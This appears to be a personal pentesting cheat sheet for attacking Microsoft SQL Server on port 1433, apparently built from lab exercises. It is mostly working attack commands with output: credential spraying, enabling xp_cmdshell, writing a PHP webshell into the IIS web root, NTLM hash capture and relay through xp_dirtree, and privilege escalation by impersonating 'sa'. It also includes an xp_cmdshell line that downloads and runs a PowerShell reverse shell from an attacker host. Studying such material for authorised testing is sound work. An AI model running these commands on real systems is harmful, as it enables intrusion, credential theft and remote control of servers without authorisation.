---
title: Port 1433 - MSSQL
draft: false
tags:
  - mssql
  - crackmapexec
  - impacket-mssqlclient
  - cme
---
What are the default databases?

`master`: Keeps information for an instance of SQL server.

`msdb`: Used by SQL Server Agent. 

`model`: Template used for other DBs. 

`resources`: Read-only. Keeps system objects visible in every DBs on the server in sys schema. 

`tempdb`: Keeps temporary objects for SQL queries. 

## Syntax

Show DBs:

```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

Select DB:

```cmd-session
1> USE users
2> GO
```

Show tables:

```cmd-session
1> SELECT table_name FROM users.INFORMATION_SCHEMA.TABLES
2> GO
```

Select all data from table users:

```cmd-session
1> SELECT * FROM users
2> go
```




## Enumeration

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## Bruteforce

Check whether creds found is valid on MSSQL:

``crackmapexec mssql manager.htb -u Desktop/user.txt -p Desktop/user.txt --no-brute --continue-on-success`

## Interaction

Using **impacket-mssqlclient**, interact with the database:

`mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth`

![](https://i.imgur.com/bR3FwZc.png)

Below are example interaction:

```sql
SELECT name FROM master.dbo.sysdatabases;
USE master;
select table_name from information_schema.tables;
SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, NUMERIC_PRECISION, NUMERIC_SCALE from information_schema.columns where table_name = 'spt_fallback_db';
```



  

## Command Execution
### xp_cmdshell

xp_cmdshell is disabled by default. 

For example:

```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Try **xp_cmdshell** and **xp_dirtree**:
  

```sql
xp_dirtree
xp_cmdshell
EXEC xp_cmdshell
EXEC xp_dirtree
```



  If they are not enabled, try enabling them:

  

```sql
enable xp_cmdshell

EXEC sp_configure 'show advanced options', 1;

RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;

RECONFIGURE;
```

  there are other methods to get CME such as [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

### Example CME

If there's **IIS** running and **xp_dirtree** is enabled:

```sql
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```


### Write Local File

To write local file for CME,  we need to have Ole Automation Procedures enabled (Needs Admin privilege). 

How to enable:

```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Now that Ole Automation Procedures is enabled, let's create a file:

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files

by default, MSSQL allows file read on any file in the OS to which account has read access. 

How to read local files in MSSQL:

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```


## Capture MSSQL Service Hash

We can steal MSSQL Service account hash using `xp_subdirs` or `xp_dirtree`. 

Above two uses SMB protocol to retrieve a list of child directories.

To make this happen, we first need Responder or impacket-smbserver set up and execute following SQL queries.

Using `xp_dirtree`:

```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

Using `xp_subdirs`:

```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to the server, attacker will obtain its hash. 

We can set up listening server as the following.

Set up responder:

```shell-session
sudo responder -I tun0
```

Set up impacket:

```shell-session
sudo impacket-smbserver share ./ -smb2support
```

## User Impersonation

`IMPERSONATE` allows attacker to execute commands with another user permission. 

Let's first identify users we can impersonate:

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

 One liner:

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

To make sure, let's verify if the current user got the sysadmin role. Since the output is 0, we don't have the role:


```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Let's use `EXECUTE AS LOGIN` to impersonate `sa`:

```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

We have successfully impersonated the sa user. Also make sure we impersonate user in the master DB since all users by default have the access to that DB. 

To revert the operation and to return to the previous user, we use `REVERT`.

Even if the impersonated user is not sysadmin, still check for other DBs that user has.

## Linked Server Interaction

MSSQL has a configuration option called linked servers. 

Allows DB engine to communicate with other SQL server, or another DB product such as Oracle. 

Administrators can configure linked server using credentials from the remote server. If the credentials have sysadmin privilege, we can execute commands in the remote SQL instance. 

Let's see if there's linked servers. There is one remote server:

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```


Now let's identify the user used for the connection and its privilege. We can see that the user sa_remote is being used for connection and it is the sysadmin:

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```


We can now execute commands as the sysadmin privilege on remote server. 

```cmd-session
EXECUTE('SELECT * FROM OPENROWSET(BULK N''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) As Contents') AT [LOCAL.TEST.LINKED.SRV]
```


### Reverse Shell

First check the privilege by typing in `help`:

![](https://i.imgur.com/ADm124T.png)


Enable **xp_cmdshell**:

`enable_xp_cmdshell` & `RECONFIGURE`

![](https://i.imgur.com/zDNomDR.png)


To spawn reverse shell, prepare nishang's **Invoke-PowerShellTcp.ps1** on your attacking directory and start python HTTP server.

Using the command below, download and execute reverse shell script toward your Kali listener:

`EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.17:8000/ps-rev.ps1") | powershell -noprofile'`

![](https://i.imgur.com/ScVyR6x.png)


Now on your local netcat listener, you have a shell:

![](https://i.imgur.com/NaBRupU.png)


## Relay Attack

Follow [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack) on Hacktricks.

First start Responder:

`sudo responder -I tun0`

![](https://i.imgur.com/7mAQptg.png)


Now on MSSQL connection, make a request to Kali's responder:

`xp_dirtree '\\10.10.14.17\home\yoon`

![](https://i.imgur.com/3e75O33.png)



Instantly, reponsder captures NTLM hash:

![](https://i.imgur.com/OCuWc95.png)


On [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server), there's more detailed guide on pentesting MSSQL.
